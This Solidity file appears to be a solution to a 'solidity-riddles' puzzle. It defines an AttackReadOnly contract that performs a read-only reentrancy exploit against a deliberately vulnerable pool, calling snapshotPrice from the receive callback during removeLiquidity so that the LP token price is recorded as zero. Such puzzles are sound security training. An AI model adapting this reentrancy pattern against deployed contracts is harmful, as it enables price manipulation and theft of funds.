// SPDX-License-Identifier: MIT
pragma solidity >=0.8.15;

import {ReadOnlyPool, VulnerableDeFiContract} from "../solidity-riddles/ReadOnly.sol";

/**
 * @title AttackReadOnly
 * @dev There is a read only exploit, attacker can addLiquidity and after that call removeLiquidity and in callback receive it can
 * VulnerableDeFiContract snapshotPrice which will set lpTokenPrice to zero, because _burn will be called after it return from receive context.
 */
contract AttackReadOnly {
    VulnerableDeFiContract defiContract;
    ReadOnlyPool readOnlyPool;

    constructor(VulnerableDeFiContract _defiContract, ReadOnlyPool _readOnlyPool) {
        readOnlyPool = _readOnlyPool;
        defiContract = _defiContract;
    }

    function exploit() public payable {
        readOnlyPool.addLiquidity{value: msg.value}();
        readOnlyPool.removeLiquidity();
    }

    receive() external payable {
        defiContract.snapshotPrice();
    }
}
